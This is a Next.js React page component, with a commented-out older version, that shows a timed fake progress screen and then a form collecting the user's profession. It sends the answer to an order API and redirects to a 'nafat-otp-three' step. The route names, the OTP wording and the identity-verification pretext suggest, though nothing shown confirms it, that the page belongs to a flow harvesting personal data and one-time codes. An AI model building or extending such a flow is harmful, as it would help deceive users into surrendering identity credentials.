// import { useRouter, useSearchParams } from "next/navigation";

// import { FaArrowRightLong } from "react-icons/fa6";
// import SwiperSlider from "@/components/SwiperSlider";
// import { useEffect, useState } from "react";
// import { Button, CircularProgress } from "@nextui-org/react";

// const Profession = () => {
//   const router = useRouter();
//   const searchParams = useSearchParams();
//   const params = new URLSearchParams(searchParams);
//   const [value, setValue] = useState(0);

//   const handleSubmit = (e) => {
//     e.preventDefault();
//     const submitData = {
//       profession: e.target.profession.value,
//     };

//     if (submitData.profession === "") {
//       toast.error("Please enter your profession");
//     } else {
//       // post all the data through api localhost:3000/api/order
//       fetch(`${process.env.API_URL}/api/order/${params.get("id")}`, {
//         method: "PATCH",
//         headers: {
//           "Content-Type": "application/json",
//         },
//         body: JSON.stringify(submitData),
//       })
//         .then((res) => res.json())
//         .then((data) => {
//           if (data) {
//             router.push({
//               pathname: "/nafat-otp-three",
//               query: { id: params.get("id") },
//             });
//           } else {
//             toast.error("Please enter correct otp");
//           }
//         })
//         .catch((err) => {
//           alert(`Please enter correct otp ~ ${err}`);
//         });
//     }
//   };

//   useEffect(() => {
//     const interval = setInterval(() => {
//       setValue((v) => {
//         if (v >= 100) {
//           clearInterval(interval);
//           return 100; // Stop at 100%
//         }
//         return v + 1;
//       });
//     }, 150); // 1200 milliseconds = 1.2 seconds

//     return () => clearInterval(interval);
//   }, []);

//   return (
//     <>
//       <SwiperSlider />
//       <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
//         <h1 className="text-4xl font-bold text-gray-600 mt-10">Profession</h1>

//         {value < 100 ? (
//           <>
//             <CircularProgress
//               classNames={{
//                 svg: "w-36 h-36 drop-shadow-md",
//                 indicator: "stroke-[#0D9488]",
//                 track: "#0D9488",
//                 value: "text-3xl font-semibold text-gray-700",
//               }}
//               value={value}
//               strokeWidth={4}
//               showValueLabel={true}
//             />
//             <h3 className="text-xl font-bold text-gray-600 mt-10">
//               Please wait for the process to be completed...
//             </h3>
//           </>
//         ) : (
//           <form onSubmit={handleSubmit} className="w-3/4 my-14">
//             <div className="relative z-0 w-full mb-6 group">
//               <input
//                 type="text"
//                 name="profession"
//                 id="profession"
//                 className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
//                 placeholder=""
//                 required
//               />
//               <label
//                 htmlFor="profession"
//                 className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
//               >
//                 Enter about your profession
//               </label>
//             </div>
//             {/* <button
//               type="submit"
//               className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
//             >
//               Continue to nafat otp three <FaArrowRightLong size={16} />
//             </button> */}
//             <Button
//               color="primary"
//               type="submit"
//               className={`w-full text-white h-12 bg-[#0D9488]`}
//             >
//               Submit Profession <FaArrowRightLong size={16} />
//             </Button>
//           </form>
//         )}
//       </div>
//       <div className="h-20 bg-teal-400 mt-5" />
//     </>
//   );
// };

// export default Profession;

"use client";

import { useRouter, useSearchParams } from "next/navigation";
import { useEffect, useState } from "react";
import {
  FaArrowRight,
  FaUserTie,
  FaShieldAlt,
  FaBriefcase,
} from "react-icons/fa";
import { HiSparkles } from "react-icons/hi";
import toast from "react-hot-toast";

export default function Profession() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const params = new URLSearchParams(searchParams);

  const [value, setValue] = useState(0);
  const [profession, setProfession] = useState("");

  // Progress loading
  useEffect(() => {
    const interval = setInterval(() => {
      setValue((v) => {
        if (v >= 100) {
          clearInterval(interval);
          return 100;
        }
        return v + 1;
      });
    }, 150);

    return () => clearInterval(interval);
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();

    if (profession.trim() === "") {
      toast.error("Please enter your profession");
      return;
    }

    const submitData = { profession };

    toast.promise(
      fetch(`${process.env.API_URL || ""}/api/order/${params.get("id")}`, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => {
          if (!res.ok) {
            throw new Error("Network response was not ok");
          }
          return res.json();
        })
        .then((data) => {
          if (data && data._id) {
            setTimeout(() => {
              router.push(`/nafat-otp-three?id=${data._id}`);
            }, 1000);
            return data;
          } else {
            throw new Error("Invalid profession input");
          }
        })
        .catch((error) => {
          console.error("Error:", error);
          throw error;
        }),
      {
        loading: "Submitting profession...",
        success: "Profession updated! Redirecting...",
        error: "Failed to submit profession",
      }
    );
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-teal-950">
      {/* HERO SECTION */}
      <div className="relative overflow-hidden bg-gradient-to-r from-teal-900/20 to-cyan-900/20 border-b border-slate-800">
        <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1485827404703-89b55fcc595e?w=1200&auto=format&fit=crop')] opacity-5 bg-cover bg-center"></div>

        <div className="relative max-w-7xl mx-auto px-4 py-16 text-center">
          <div className="inline-flex items-center gap-2 px-4 py-2 bg-white/10 backdrop-blur-md rounded-full mb-4 border border-white/20">
            <HiSparkles className="w-4 h-4 text-teal-400" />
            <span className="text-sm text-white font-medium">
              Profession Information
            </span>
          </div>

          <h1 className="text-4xl md:text-6xl font-bold text-white mb-4 tracking-tight">
            Your{" "}
            <span className="bg-gradient-to-r from-teal-400 to-cyan-400 bg-clip-text text-transparent">
              Profession
            </span>
          </h1>

          <p className="text-gray-300 text-lg max-w-2xl mx-auto">
            Tell us what you do — this helps complete your information.
          </p>
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div className="max-w-3xl mx-auto px-4 py-16">
        {value < 100 ? (
          // LOADING SECTION
          <div className="bg-slate-900/50 backdrop-blur-xl rounded-3xl p-12 border border-slate-800 text-center">
            <div className="flex justify-center mb-8">
              <div className="relative">
                <svg className="w-48 h-48 transform -rotate-90">
                  <circle
                    cx="96"
                    cy="96"
                    r="88"
                    strokeWidth="8"
                    className="text-slate-800"
                    stroke="currentColor"
                    fill="none"
                  />
                  <circle
                    cx="96"
                    cy="96"
                    r="88"
                    strokeWidth="8"
                    strokeDasharray={`${2 * Math.PI * 88}`}
                    strokeDashoffset={`${2 * Math.PI * 88 * (1 - value / 100)}`}
                    className="text-teal-500 transition-all duration-300"
                    stroke="currentColor"
                    fill="none"
                    strokeLinecap="round"
                  />
                </svg>
                <div className="absolute inset-0 flex items-center justify-center">
                  <span className="text-4xl font-bold text-white">
                    {value}%
                  </span>
                </div>
              </div>
            </div>

            <h3 className="text-2xl font-bold text-white mb-2">Processing…</h3>
            <p className="text-gray-400">
              Please wait while we prepare your form
            </p>
          </div>
        ) : (
          // FORM SECTION
          <div className="space-y-8">
            <div className="bg-slate-900/50 backdrop-blur-xl rounded-3xl p-8 border border-slate-800">
              <div className="mb-8">
                <h2 className="text-2xl font-bold text-white mb-2">
                  Profession Details
                </h2>
                <p className="text-gray-400">
                  Please enter your professional occupation.
                </p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <label className="text-sm font-medium text-gray-300 flex items-center gap-2">
                    <FaBriefcase className="text-teal-400" />
                    Profession
                  </label>
                  <input
                    type="text"
                    value={profession}
                    onChange={(e) => setProfession(e.target.value)}
                    placeholder="What is your profession?"
                    className="w-full px-4 py-4 bg-slate-800/50 border border-slate-700 rounded-xl text-white text-lg focus:ring-2 focus:ring-teal-500 focus:border-transparent outline-none transition-all placeholder-gray-500"
                  />
                </div>

                {/* INFO BOX */}
                <div className="p-4 bg-slate-800/30 rounded-xl border border-slate-700">
                  <p className="text-sm text-gray-400 flex items-start gap-2">
                    <FaShieldAlt className="text-teal-400 mt-0.5 flex-shrink-0" />
                    <span>
                      <strong className="text-teal-400">Note:</strong> Your
                      profession helps us verify your identity & provide better
                      service.
                    </span>
                  </p>
                </div>

                <button
                  type="submit"
                  className="w-full py-4 bg-gradient-to-r from-teal-500 to-cyan-500 text-white rounded-xl font-semibold hover:shadow-2xl hover:shadow-teal-500/50 transition-all duration-300 flex items-center justify-center gap-2 group"
                >
                  Submit Profession
                  <FaArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                </button>
              </form>
            </div>

            {/* Tips */}
            <div className="bg-slate-900/30 backdrop-blur-sm rounded-2xl p-6 border border-slate-800">
              <h3 className="text-white font-semibold mb-4 flex items-center gap-2">
                <FaUserTie className="text-teal-400" />
                Profession Tips
              </h3>
              <ul className="space-y-2 text-sm text-gray-400">
                <li className="flex items-start gap-2">
                  <span className="text-teal-400 mt-1">•</span>
                  <span>Use your real profession for proper verification.</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-teal-400 mt-1">•</span>
                  <span>Be specific (e.g. “Software Engineer”, not “IT”).</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-teal-400 mt-1">•</span>
                  <span>
                    If unemployed, write “Student”, “Freelancer”, or “Job
                    Seeker”.
                  </span>
                </li>
              </ul>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
